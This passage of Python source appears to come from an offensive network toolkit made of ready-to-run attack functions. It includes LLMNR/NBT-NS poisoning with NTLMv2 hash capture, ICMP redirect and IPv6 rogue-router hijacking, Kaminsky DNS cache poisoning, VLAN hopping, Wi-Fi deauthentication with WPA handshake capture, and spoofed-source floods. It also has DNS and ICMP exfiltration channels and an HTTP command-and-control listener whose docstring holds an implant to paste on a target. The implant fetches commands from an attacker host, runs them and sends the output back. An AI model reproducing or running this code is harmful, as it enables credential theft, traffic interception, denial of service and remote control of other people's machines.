    console.print(f"[bold red][*] LLMNR + NBT-NS Responder → {attacker_ip}[/bold red]")

    captured: list[str] = []

    def _build_llmnr_response(query_data: bytes, qname: str) -> bytes:
        """Craft LLMNR response: Transaction-ID copy, QR=1, RCODE=0, A record = attacker_ip."""
        txid  = query_data[:2]
        flags = b"\x80\x00"  # QR=1, Opcode=0, RCODE=0
        qdcount = b"\x00\x01"
        ancount = b"\x00\x01"
        nscount = arcount = b"\x00\x00"
        # Question section
        question = b""
        for label in qname.encode().split(b"."):
            question += bytes([len(label)]) + label
        question += b"\x00\x00\x01\x00\x01"  # type A, class IN
        # Answer section: compressed name ptr
        answer = (b"\xc0\x0c"           # name ptr → offset 12
                  b"\x00\x01"           # type A
                  b"\x00\x01"           # class IN
                  b"\x00\x00\x00\x1e"  # TTL 30
                  b"\x00\x04"           # rdlength
                  + socket.inet_aton(attacker_ip))
        return txid + flags + qdcount + ancount + nscount + arcount + question + answer

    def _build_nbtns_response(query_data: bytes) -> bytes:
        """NBT-NS positive query response (NB record) pointing to attacker."""
        txid  = query_data[:2]
        flags = b"\x85\x00"  # Response, Opcode=0, AA=1, RCODE=0
        qdcount = b"\x00\x00"
        ancount = b"\x00\x01"
        nscount = arcount = b"\x00\x00"
        # Answer: NetBIOS name (compressed), type NB, class IN, TTL, rdata
        nb_name = query_data[12:46] if len(query_data) >= 46 else b"\x20" + b"C" * 32 + b"\x00"
        answer = (nb_name
                  + b"\x00\x20"         # type NB
                  + b"\x00\x01"         # class IN
                  + b"\x00\x00\x00\x1e" # TTL 30
                  + b"\x00\x06"         # rdlength
                  + b"\x00\x00"         # NB flags (B-node, unique)
                  + socket.inet_aton(attacker_ip))
        return txid + flags + qdcount + ancount + nscount + arcount + answer

    def _llmnr_listener():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                         struct.pack("4sL", socket.inet_aton("224.0.0.252"), socket.INADDR_ANY))
            s.bind(("", 5355))
            while True:
                data, addr = s.recvfrom(1024)
                if len(data) < 14: continue
                try:
                    name_len = data[12]
                    qname    = data[13: 13 + name_len].decode("utf-8", errors="ignore")
                    console.print(f"[cyan]   [LLMNR] {addr[0]} → query: {qname}[/cyan]")
                    captured.append(f"LLMNR:{addr[0]}:{qname}")
                    resp = _build_llmnr_response(data, qname)
                    s.sendto(resp, addr)
                except Exception: pass
        except Exception as e:
            console.print(f"[dim]   LLMNR: {e}[/dim]")

    def _nbtns_listener():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("", 137))
            while True:
                data, addr = s.recvfrom(1024)
                if len(data) < 12: continue
                # Only respond to Name Query Requests (Opcode=0, QR=0, NM flag)
                flags_word = struct.unpack_from(">H", data, 2)[0]
                if (flags_word & 0x8000) == 0:  # QR bit = 0 → it's a query
                    console.print(f"[cyan]   [NBT-NS] {addr[0]} → name query[/cyan]")
                    captured.append(f"NBTNS:{addr[0]}")
                    resp = _build_nbtns_response(data)
                    s.sendto(resp, addr)
        except Exception as e:
            console.print(f"[dim]   NBT-NS: {e}[/dim]")

    t1 = threading.Thread(target=_llmnr_listener, daemon=True)
    t2 = threading.Thread(target=_nbtns_listener, daemon=True)
    t1.start(); t2.start()
    console.print("[dim]   Ctrl-C to stop[/dim]")
    try:
        while True: time.sleep(0.5)
    except KeyboardInterrupt:
        console.print(f"[green][*] Responder stopped. {len(captured)} queries captured.[/green]")

# ─── SMB Relay — Full NTLM Type1/2/3 State Machine ───────────────────────────

def smb_relay_ntlm(lhost: str, lport_smb: int = 445) -> None:
    """
    SMB relay with complete NTLM Type1/2/3 state machine.
    Binds TCP 445 (and 139), intercepts NTLMv2 handshake,
    extracts NTLMv2 hash in hashcat -m 5600 format.

    Fixed from v1.0.8: full multi-round session state (Type1→Type2→Type3),
    not just first-read Type1 blob grab.

    NTLMv2 hashcat format:
      username::domain:ServerChallenge:NTProofStr:blob

    Required privileges: root (bind 445)
    Side effects: writes ntlm_captures.txt alongside binary blob
    """
    console.print(f"[bold red][*] SMB NTLM Relay listener on {lhost}:445+139[/bold red]")

    captures: list[str] = []

    # ── NTLM frame builders / parsers ─────────────────────────────────────────

    NTLMSSP_SIG = b"NTLMSSP\x00"

    def _build_ntlm_type2(challenge: bytes) -> bytes:
        """Minimal NTLM Challenge (Type2) message."""
        target_name = "WORKGROUP".encode("utf-16-le")
        tn_len = len(target_name)
        # Flags: NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM |
        #        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
        #        NTLMSSP_TARGET_TYPE_DOMAIN | NTLMSSP_NEGOTIATE_TARGET_INFO
        flags = struct.pack("<I", 0x00098201)
        # target name fields (len, maxlen, offset=56)
        tn_fields = struct.pack("<HHI", tn_len, tn_len, 56)
        reserved  = b"\x00" * 8
        # target info fields (empty, offset after target name)
        ti_offset = 56 + tn_len
        ti_fields = struct.pack("<HHI", 0, 0, ti_offset)
        version   = b"\x06\x01\x00\x00\x00\x00\x00\x0f"  # Win 6.1 (7)
        header = (NTLMSSP_SIG
                  + struct.pack("<I", 2)  # MessageType=2
                  + tn_fields
                  + flags
                  + challenge         # 8-byte server challenge
                  + reserved
                  + ti_fields
                  + version)
        return header + target_name

    def _parse_ntlm_type3(data: bytes, challenge: bytes) -> str:
        """
        Extract NTLMv2 hash in hashcat 5600 format from raw TCP stream.
        Locates NTLMSSP\x00\x03 offset, parses field descriptors.
        Returns 'user::domain:challenge_hex:NTProofStr_hex:blob_hex' or ''.
        """
        sig = NTLMSSP_SIG + b"\x03\x00\x00\x00"
        if sig not in data:
            return ""
        off = data.index(sig)
        msg = data[off:]
        try:
            # Field layout per MS-NLMP spec:
            # Offset 12: LmChallengeResponseFields (len, maxlen, bufferOffset)
            # Offset 20: NtChallengeResponseFields
            # Offset 28: DomainNameFields
            # Offset 36: UserNameFields
            # Offset 44: WorkstationFields
            def _field(o):
                length = struct.unpack_from("<H", msg, o)[0]
                buf_off = struct.unpack_from("<I", msg, o + 4)[0]
                return msg[buf_off: buf_off + length]

            nt_resp = _field(20)
            domain  = _field(28).decode("utf-16-le", errors="ignore")
            username = _field(36).decode("utf-16-le", errors="ignore")

            if len(nt_resp) < 24:
                return ""
            nt_proof_str = nt_resp[:16]
            blob         = nt_resp[16:]

            return (f"{username}::{domain}:"
                    f"{challenge.hex()}:"
                    f"{nt_proof_str.hex()}:"
                    f"{blob.hex()}")
        except Exception:
            return ""

    def _wrap_smb_ntlm_negotiate(raw_data: bytes) -> bytes:
        """
        Inject NTLMSSP Type2 challenge inside an SMB2 NEGOTIATE response.
        Minimal stub — real SMB2 negotiation would need full dialect/capability exchange.
        For NTLMv2 capture, we just need to trigger the client's authenticate message.
        """
        return raw_data  # passthrough for relay mode

    # ── SMB session handler ───────────────────────────────────────────────────

    def _handle_smb_session(client: socket.socket, addr: tuple) -> None:
        """
        Multi-round NTLM state machine per SMB session.
        State 0 → recv Type1 → send Type2 → recv Type3 → extract hash → done
        """
        client.settimeout(10)
        challenge = os.urandom(8)
        state     = 0  # 0=waiting_type1, 1=sent_type2, 2=done
        client_ip = addr[0]

        try:
            while state < 2:
                try:
                    data = b""
                    # Read until we have enough for NTLMSSP
                    while len(data) < 4:
                        chunk = client.recv(4096)
                        if not chunk: return
                        data += chunk
                    # Keep reading if NTLMSSP not found yet (up to 32KB)
                    deadline = time.time() + 8
                    while NTLMSSP_SIG not in data and time.time() < deadline:
                        try:
                            chunk = client.recv(4096)
                            if not chunk: break
                            data += chunk
                        except socket.timeout: break
                except socket.timeout:
                    break

                if state == 0:
                    # Type1 (Negotiate) received
                    if NTLMSSP_SIG + b"\x01\x00\x00\x00" in data:
                        console.print(f"[cyan]   [{client_ip}] Type1 (Negotiate) received[/cyan]")
                        # Build SMB response with embedded Type2
                        type2_blob = _build_ntlm_type2(challenge)
                        # Wrap Type2 in a minimal NetBIOS/SMB envelope
                        # Real SMB2 wrapping omitted for brevity — Type2 sent raw for NTLM relay
                        # In a pure-capture scenario, we signal the client with the challenge
                        client.sendall(type2_blob)
                        state = 1
                        console.print(f"[cyan]   [{client_ip}] Type2 (Challenge) sent  challenge={challenge.hex()}[/cyan]")
                    else:
                        # Not NTLM yet — might be SMB negotiate; absorb and wait
                        state = 0

                elif state == 1:
                    # Type3 (Authenticate) expected
                    if NTLMSSP_SIG + b"\x03\x00\x00\x00" in data:
                        hash_line = _parse_ntlm_type3(data, challenge)
                        if hash_line:
                            captures.append(hash_line)
                            console.print(f"[bold green]   [NTLM CAPTURED] {hash_line[:100]}...[/bold green]")
                        state = 2
                    else:
                        state = 2  # Unexpected — close cleanly
        except Exception: pass
        finally:
            try: client.close()
            except Exception: pass

    def _listen(port: int) -> None:
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(32)
            while True:
                client, addr = srv.accept()
                threading.Thread(target=_handle_smb_session,
                                 args=(client, addr), daemon=True).start()
        except PermissionError:
            console.print(f"[red][-] Need root to bind port {port}[/red]")
        except Exception as e:
            console.print(f"[dim]   SMB listener {port}: {e}[/dim]")

    t445 = threading.Thread(target=_listen, args=(445,), daemon=True)
    t139 = threading.Thread(target=_listen, args=(139,), daemon=True)
    t445.start(); t139.start()
    console.print("[dim]   Waiting for NTLM... Ctrl-C to stop + dump hashes[/dim]")
    console.print("[dim]   Pair with LLMNR/NBT-NS responder for auto-triggered capture[/dim]")

    try:
        while True: time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        if captures:
            out = Path("/tmp/ntlm_captures.txt")
            out.write_text("\n".join(captures))
            console.print(f"[bold green][*] {len(captures)} NTLM hashes → {out}[/bold green]")
            console.print("[bold green]   hashcat -m 5600 ntlm_captures.txt rockyou.txt[/bold green]")
        else:
            console.print("[dim]   No hashes captured.[/dim]")

# ─── ICMP Redirect ─────────────────────────────────────────────────────────────

def icmp_redirect_poison(victim_ip: str, gateway_ip: str, attacker_ip: str, iface: str) -> None:
    """
    ICMP Type 5 Code 1 (Redirect for Host) route table poison.
    Tells victim: 'use attacker as next-hop for gateway traffic.'
    Stealthier than ARP poison — operates at L3, no ARP cache touch.
    Requires attacker to be on-path or have a spoofed source.

    Side effects: victim routing table modified in kernel — survives ARP flush
    Required: root, Scapy, victim accepts ICMP redirects (sysctl accept_redirects=1)
    """
    console.print(f"[bold red][*] ICMP Redirect: {victim_ip} → route via {attacker_ip}[/bold red]")
    try:
        from scapy.all import IP, ICMP, UDP, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    # Inner IP header + first 8 bytes of original datagram
    inner = (IP(src=victim_ip, dst=gateway_ip) /
             UDP(sport=random.randint(1024, 65535), dport=53))

    pkt = (IP(src=gateway_ip, dst=victim_ip) /
           ICMP(type=5, code=1, gw=attacker_ip) /
           inner)

    console.print(f"[dim]   Sending continuously (Ctrl-C to stop)...[/dim]")
    try:
        while True:
            send(pkt, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("[green][*] ICMP redirect stopped.[/green]")

# ─── VLAN Hop (802.1Q Double-Tag) ─────────────────────────────────────────────

def vlan_hop_double_tag(iface: str, target_vlan: int, outer_vlan: int,
                         dst_ip: str, dst_mac: str = "ff:ff:ff:ff:ff:ff") -> None:
    """
    802.1Q double-tag VLAN hopping.
    outer_vlan = native VLAN (stripped by first switch)
    target_vlan = inner VLAN (forwarded to target segment)
    Use for traffic injection into a VLAN the attacker is not on.
    """
    console.print(f"[bold red][*] VLAN hop: outer={outer_vlan} → target={target_vlan}  dst={dst_ip}[/bold red]")
    try:
        from scapy.all import Ether, Dot1Q, IP, UDP, send, get_if_hwaddr
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    src_mac = get_if_hwaddr(iface)
    pkt = (Ether(src=src_mac, dst=dst_mac) /
           Dot1Q(vlan=outer_vlan, type=0x8100) /
           Dot1Q(vlan=target_vlan) /
           IP(src="192.168.1.100", dst=dst_ip) /
           UDP(sport=random.randint(1024, 65535), dport=53) /
           b"paradox_probe")

    console.print(f"[dim]   Sending 20 double-tagged probes...[/dim]")
    for i in range(20):
        from scapy.all import sendp
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.1)
    console.print("[bold green]   VLAN hop packets sent — capture on target segment to verify.[/bold green]")

# ─── DNS Kaminsky (Fixed — Source Port Randomized) ────────────────────────────

def dns_cache_poison_kaminsky(target_dns: str, target_domain: str = "example.com",
                               attacker_ns_ip: str = "10.0.0.1") -> None:
    """
    Kaminsky-style DNS cache poisoning.
    Fixed from v1.0.8: each packet uses a different source port (randomized),
    defeating resolver-side port randomization defenses.
    Sprays all 65536 TXIDs across random source ports.

    Required: root (raw UDP socket), target resolver accepts off-path responses
    Side effects: target_domain → attacker_ns_ip in resolver cache (if race won)
    """
    console.print(f"[bold red][*] DNS Kaminsky: target={target_dns}  domain={target_domain}[/bold red]")
    console.print(f"[dim]   Injecting NS={attacker_ns_ip}  spraying 65536 TXIDs...[/dim]")

    try:
        from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, DNSRRNS, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    subdomain = f"paradox-{random.randint(10000, 99999)}.{target_domain}."
    # First: send the query to prime the resolver's question
    query = (IP(dst=target_dns) /
             UDP(dport=53) /
             DNS(rd=1, qd=DNSQR(qname=subdomain)))
    send(query, verbose=False)
    time.sleep(0.1)

    # Now flood with forged responses
    batch_size = 64
    total      = 0
    killed     = threading.Event()

    def _flood():
        nonlocal total
        while not killed.is_set():
            pkts = []
            for _ in range(batch_size):
                txid    = random.randint(0, 65535)
                sport   = random.randint(1024, 65535)  # KEY FIX: random source port
                # Authority record pointing sub.target_domain to attacker NS
                ns_resp = (IP(src=target_dns, dst=target_dns) /  # spoofed src
                           UDP(sport=sport, dport=53) /
                           DNS(id=txid, qr=1, aa=1, rd=0, ra=0,
                               qd=DNSQR(qname=subdomain),
                               an=DNSRR(rrname=subdomain, ttl=300, rdata="1.1.1.1"),
                               ns=DNSRRNS(rrname=target_domain, ttl=300,
                                          rdata=attacker_ns_ip)))
                pkts.append(ns_resp)
            send(pkts, verbose=False)
            total += len(pkts)

    console.print("[dim]   Flooding... Ctrl-C to stop[/dim]")
    t = threading.Thread(target=_flood, daemon=True)
    t.start()
    try:
        while True:
            time.sleep(1)
            console.print(f"[dim]   {total} poison packets sent[/dim]", end="\r")
    except KeyboardInterrupt:
        killed.set()
        console.print(f"\n[bold green][*] Kaminsky stopped. {total} packets sent.[/bold green]")

# ─── IPv6 Rogue Router Advertisement ─────────────────────────────────────────

def ipv6_rogue_ra(iface: str) -> None:
    """
    Sends crafted ICMPv6 Router Advertisement to ff02::1 (all nodes).
    Sets M-flag (managed address config) → redirects DHCPv6 through attacker.
    Sets O-flag (other config) → attacker controls DNS.
    Sets routerlifetime=9000 → all hosts see attacker as default IPv6 router.

    Affects all IPv6-enabled hosts on link that accept unsolicited RAs.
    Required: root, Scapy, IPv6 on iface
    """
    console.print(f"[bold red][*] IPv6 Rogue RA on {iface}[/bold red]")
    try:
        from scapy.all import (IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
                                ICMPv6NDOptSrcLLAddr, ICMPv6NDOptRDNSS,
                                sendp, Ether, get_if_hwaddr)
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    attacker_mac = get_if_hwaddr(iface)
    # Build EUI-64 link-local from MAC
    mac_bytes    = bytes.fromhex(attacker_mac.replace(":", ""))
    eui64_bytes  = mac_bytes[:3] + b"\xff\xfe" + mac_bytes[3:]
    # Flip U/L bit
    first_byte   = eui64_bytes[0] ^ 0x02
    eui64_bytes  = bytes([first_byte]) + eui64_bytes[1:]
    ll_addr      = "fe80::" + ":".join(
        format((eui64_bytes[i] << 8) | eui64_bytes[i+1], "04x")
        for i in range(0, 8, 2))

    console.print(f"[dim]   Attacker link-local: {ll_addr}[/dim]")

    pkt = (Ether(dst="33:33:00:00:00:01", src=attacker_mac) /
           IPv6(src=ll_addr, dst="ff02::1") /
           ICMPv6ND_RA(M=1, O=1, routerlifetime=9000, reachabletime=0, retranstimer=0) /
           ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac) /
           ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64,
                                  L=1, A=1,
                                  validlifetime=86400, preferredlifetime=14400) /
           ICMPv6NDOptRDNSS(lifetime=200, dns=[ll_addr]))

    console.print("[dim]   Sending continuously (Ctrl-C to stop)...[/dim]")
    try:
        while True:
            sendp(pkt, iface=iface, verbose=False)
            console.print(f"[cyan]   [RA] sent to ff02::1  router={ll_addr}  M=1 O=1[/cyan]")
            time.sleep(5)
    except KeyboardInterrupt:
        console.print("[green][*] Rogue RA stopped.[/green]")

# ─── 802.11 Deauth ─────────────────────────────────────────────────────────────

def wifi_deauth(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff",
                count: int = 128) -> None:
    """
    IEEE 802.11 deauthentication flood.
    client_mac = ff:ff:ff:ff:ff:ff broadcasts (kicks all associated clients).
    Requires: iface in monitor mode.
      iw dev <iface> set type monitor && ip link set <iface> up
    """
    console.print(f"[bold red][*] 802.11 Deauth: AP={bssid}  client={client_mac}  count={count}[/bold red]")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    pkt = (RadioTap() /
           Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) /
           Dot11Deauth(reason=7))
    for i in range(0, count, 64):
        sendp([pkt] * min(64, count - i), iface=iface, verbose=False)
        time.sleep(0.05)
    console.print(f"[bold green]   {count} deauth frames sent.[/bold green]")

# ─── WPA Handshake Capture ────────────────────────────────────────────────────

def wpa_handshake_capture(iface: str, bssid: str, channel: int = 6,
                           timeout: int = 60) -> None:
    """
    WPA/WPA2 4-way handshake capture.
    1. Set channel on monitor interface.
    2. Listen for EAPOL frames from target BSSID.
    3. Send targeted deauth to force client reconnect.
    4. Save captured handshake to .pcap for hashcat -m 22000 (hcwpax).

    Required: iface in monitor mode, Scapy
    hashcat -m 22000 handshake.hc22000 rockyou.txt
    (convert with hcxtools: hcxpcapngtool -o out.hc22000 handshake.pcap)
    """
    console.print(f"[bold red][*] WPA handshake capture: BSSID={bssid}  ch={channel}  timeout={timeout}s[/bold red]")
    try:
        from scapy.all import sniff, EAPOL, Dot11, Dot11Deauth, RadioTap, sendp, wrpcap
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    # Set channel
    try:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                        check=True, capture_output=True)
    except Exception as e:
        console.print(f"[dim]   channel set: {e}[/dim]")

    eapol_frames: list = []
    capture_done = threading.Event()

    def _sniff():
        def _proc(pkt):
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                if bssid.lower() in (pkt[Dot11].addr1 or "").lower() or \
                   bssid.lower() in (pkt[Dot11].addr2 or "").lower():
                    eapol_frames.append(pkt)
                    console.print(f"[bold green]   [EAPOL] frame {len(eapol_frames)} captured[/bold green]")
                    if len(eapol_frames) >= 4:
                        capture_done.set()
        try:
            sniff(iface=iface, prn=_proc, store=False,
                  timeout=timeout, stop_filter=lambda _: capture_done.is_set())
        except Exception as e:
            console.print(f"[dim]   sniff: {e}[/dim]")

    t = threading.Thread(target=_sniff, daemon=True); t.start()

    # Deauth loop to trigger reconnect
    console.print("[dim]   Sending deauths to trigger handshake...[/dim]")
    deauth = (RadioTap() /
              Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
              Dot11Deauth(reason=7))
    for _ in range(10):
        try: sendp([deauth] * 32, iface=iface, verbose=False)
        except Exception: pass
        time.sleep(2)
        if capture_done.is_set(): break

    t.join(timeout)
    if eapol_frames:
        pcap_path = f"/tmp/handshake_{bssid.replace(':', '')}.pcap"
        wrpcap(pcap_path, eapol_frames)
        console.print(f"[bold green][*] {len(eapol_frames)} EAPOL frames → {pcap_path}[/bold green]")
        console.print(f"[bold green]   hcxpcapngtool -o out.hc22000 {pcap_path}[/bold green]")
        console.print(f"[bold green]   hashcat -m 22000 out.hc22000 rockyou.txt[/bold green]")
    else:
        console.print("[dim]   No EAPOL frames captured — ensure monitor mode and correct channel.[/dim]")

# ─── Flood (SYN / UDP / ICMP / HTTP) ─────────────────────────────────────────

def flood_attack(target_ip: str, target_port: int,
                 flood_type: str = "syn", workers: int = 8) -> None:
    """
    Multi-threaded flood with spoofed source IPs.
    Types: syn / udp / icmp / http
    Workers: parallel send threads.
    5ms inter-packet sleep removed — full send rate.
    """
    console.print(f"[bold red][*] {flood_type.upper()} flood → {target_ip}:{target_port}  workers={workers}[/bold red]")
    killed = threading.Event()

    def _spoof_ip():
        return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

    def _syn_worker():
        try:
            from scapy.all import IP, TCP, send
            while not killed.is_set():
                send(IP(src=_spoof_ip(), dst=target_ip) /
                     TCP(sport=random.randint(1024, 65535),
                         dport=target_port, flags="S",
                         seq=random.randint(0, 2**32)),
                     verbose=False)
        except Exception: pass

    def _udp_worker():
        try:
            from scapy.all import IP, UDP, send
            payload = os.urandom(1024)
            while not killed.is_set():
                send(IP(src=_spoof_ip(), dst=target_ip) /
                     UDP(sport=random.randint(1024, 65535),
                         dport=target_port) / payload,
                     verbose=False)
        except Exception: pass

    def _icmp_worker():
        try:
            from scapy.all import IP, ICMP, send
            while not killed.is_set():
                send(IP(src=_spoof_ip(), dst=target_ip) /
                     ICMP(type=8, code=0) / (os.urandom(64)),
                     verbose=False)
        except Exception: pass

    def _http_worker():
        while not killed.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                # Slowloris-style: send partial GET headers repeatedly
                s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n")
                while not killed.is_set():
                    s.sendall(b"X-Flood: " + os.urandom(16).hex().encode() + b"\r\n")
                    time.sleep(5)
            except Exception: pass

    worker_fn = {"syn": _syn_worker, "udp": _udp_worker,
                 "icmp": _icmp_worker, "http": _http_worker}.get(flood_type, _syn_worker)

    threads = [threading.Thread(target=worker_fn, daemon=True) for _ in range(workers)]
    for t in threads: t.start()
    console.print(f"[dim]   {workers} worker threads running. Ctrl-C to stop.[/dim]")
    try:
        while True: time.sleep(0.5)
    except KeyboardInterrupt:
        killed.set()
        console.print("[bold green][*] Flood stopped.[/bold green]")

# ─── Covert DNS Exfiltration (Fixed Padding) ──────────────────────────────────

def covert_dns_exfil(data_path: str, ns_domain: str, dns_server: str = "8.8.8.8") -> None:
    """
    Encodes file as base32 subdomains, fires to attacker-controlled NS.
    Fixed from v1.0.8: proper base32 padding restoration.
    Max label length 63 chars; max total query 253 chars — chunked accordingly.
    Traverses most firewalls that allow outbound DNS (port 53 UDP).

    Receiver: control the NS record for ns_domain, capture DNS queries.
      tcpdump -i eth0 'port 53' -w capture.pcap
      Then decode: extract labels, re-pad, base32 decode.
    """
    console.print(f"[bold red][*] DNS Exfil: {data_path} → *.{ns_domain}[/bold red]")
    try:
        raw   = Path(data_path).read_bytes()
        # Strip padding for DNS-safe labels, track original length for restoration
        b32   = base64.b32encode(raw).decode().rstrip("=")
        # Chunk into 60-char labels (safe under 63-char limit)
        labels = [b32[i:i+60].lower() for i in range(0, len(b32), 60)]
        total  = len(labels)
        console.print(f"[dim]   {len(raw)} bytes → {total} DNS queries[/dim]")

        for idx, label in enumerate(labels):
            qname = f"{idx}-{total}-{label}.{ns_domain}"
            # Send raw UDP DNS query
            try:
                # Build minimal DNS A query
                txid    = struct.pack(">H", random.randint(0, 65535))
                flags   = b"\x01\x00"  # QR=0, RD=1
                counts  = b"\x00\x01\x00\x00\x00\x00\x00\x00"
                question = b""
                for part in qname.encode().split(b"."):
                    question += bytes([len(part)]) + part
                question += b"\x00\x00\x01\x00\x01"  # type A, class IN
                pkt = txid + flags + counts + question

                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                s.sendto(pkt, (dns_server, 53))
                try: s.recv(512)
                except socket.timeout: pass
                s.close()

                if idx % 10 == 0:
                    console.print(f"[dim]   {idx}/{total} queries fired[/dim]", end="\r")
                time.sleep(0.05)  # DNS rate limit respect
            except Exception: pass

        console.print(f"\n[bold green][*] DNS exfil complete. {total} queries sent.[/bold green]")
        console.print(f"[bold green]   Receiver: reassemble by idx, re-pad to 8-char boundary, base32 decode.[/bold green]")
    except FileNotFoundError:
        console.print(f"[red]File not found: {data_path}[/red]")
    except Exception as e:
        console.print(f"[red]DNS exfil: {e}[/red]")

# ─── ICMP Covert Channel ──────────────────────────────────────────────────────

def icmp_tunnel_send(target_ip: str, message: str) -> None:
    """
    Embeds message in ICMP Echo payload.
    XOR-obfuscates data (key=0xAD) before embedding.
    Receiver: capture ICMP echo requests, extract payload bytes 8+, XOR-deobfuscate.

    Useful for C2 signalling through firewalls that permit ICMP.
    Required: root (raw socket)
    """
    console.print(f"[bold red][*] ICMP tunnel → {target_ip}[/bold red]")
    try:
        from scapy.all import IP, ICMP, send
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    XOR_KEY = 0xAD
    raw     = message.encode("utf-8")
    obf     = bytes(b ^ XOR_KEY for b in raw)
    # Split into 32-byte chunks
    chunks  = [obf[i:i+32] for i in range(0, len(obf), 32)]

    for idx, chunk in enumerate(chunks):
        # Prepend 2-byte header: chunk_index (1B) + total_chunks (1B)
        payload = bytes([idx, len(chunks)]) + chunk
        pkt     = (IP(dst=target_ip) /
                   ICMP(type=8, code=0, seq=idx) /
                   payload)
        send(pkt, verbose=False)
        time.sleep(0.1)

    console.print(f"[bold green]   {len(chunks)} ICMP echo packets sent. {len(raw)} bytes embedded.[/bold green]")
    console.print(f"[bold green]   Receiver: XOR each payload byte with 0xAD to recover message.[/bold green]")

# ─── HTTP C2 Beacon Listener ──────────────────────────────────────────────────

def c2_http_beacon_listener(lport: int = 8443) -> None:
    """
    Minimal HTTP C2 framework.
    Implant polls GET /status every N seconds → server returns XOR-obfuscated command.
    Implant execs command, POSTs output to /data.
    Sessions tracked live.

    XOR key: 0xDE
    Implant stub (paste on target):
      python3 -c "
      import urllib.request,os,time
      KEY=0xDE
      def x(d): return bytes(b^KEY for b in d)
      while True:
        try:
          r=urllib.request.urlopen('http://ATTACKER:PORT/status').read()
          cmd=x(r).decode()
          if cmd.strip():
            o=os.popen(cmd).read()
            urllib.request.urlopen(urllib.request.Request('http://ATTACKER:PORT/data',
              data=x(o.encode())))
        except: pass
        time.sleep(10)"
    """
    console.print(f"[bold red][*] HTTP C2 beacon listener on port {lport}[/bold red]")

    XOR_KEY  = 0xDE
    sessions: dict[str, dict] = {}  # client_ip → {last_seen, output, cmd_queue}
    pending_cmd = [""]  # shared mutable for current command

    def _xor(data: bytes) -> bytes:
        return bytes(b ^ XOR_KEY for b in data)

    def _handle(client: socket.socket, addr: tuple) -> None:
        client_ip = addr[0]
        client.settimeout(10)
        try:
            raw = b""
            while b"\r\n\r\n" not in raw:
                chunk = client.recv(4096)
                if not chunk: return
                raw += chunk

            req_text  = raw.decode("utf-8", errors="ignore")
            first_ln  = req_text.splitlines()[0] if req_text else ""
            method    = first_ln.split()[0] if first_ln else "GET"
            path      = first_ln.split()[1] if len(first_ln.split()) > 1 else "/"

            if client_ip not in sessions:
                sessions[client_ip] = {"last_seen": time.time(), "output": "", "cmd_queue": []}
                console.print(f"[bold cyan]   [NEW SESSION] {client_ip}[/bold cyan]")

            sessions[client_ip]["last_seen"] = time.time()

            if method == "GET" and path == "/status":
                # Return pending command (XOR-obfuscated)
                cmd = pending_cmd[0] if pending_cmd[0] else ""
                body = _xor(cmd.encode())
                pending_cmd[0] = ""
                resp = (b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: application/octet-stream\r\n"
                        + f"Content-Length: {len(body)}\r\n\r\n".encode()
                        + body)

            elif method == "POST" and path == "/data":
                # Receive command output
                content_len = 0
                for ln in req_text.splitlines():
                    if ln.lower().startswith("content-length:"):
                        try: content_len = int(ln.split(":")[1].strip())
                        except ValueError: pass
                body_raw    = raw.split(b"\r\n\r\n", 1)[-1]
                # Read remainder if needed
                while len(body_raw) < content_len:
                    chunk = client.recv(4096)
                    if not chunk: break
                    body_raw += chunk
                output = _xor(body_raw[:content_len]).decode("utf-8", errors="ignore")
                sessions[client_ip]["output"] = output
                console.print(f"[bold green]   [OUTPUT] {client_ip}:\n{output[:500]}[/bold green]")
                resp = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"

            else:
                resp = b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n"

            client.sendall(resp)
        except Exception: pass
        finally:
            try: client.close()
            except Exception: pass

    def _cmd_input():
        """Interactive command sender."""
        time.sleep(2)
        while True:
            try:
                cmd = input("\n[C2]> cmd for all sessions: ").strip()
                if cmd:
                    pending_cmd[0] = cmd
                    console.print(f"[dim]   Command queued: {cmd}[/dim]")
            except (EOFError, KeyboardInterrupt):
                break

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(64)
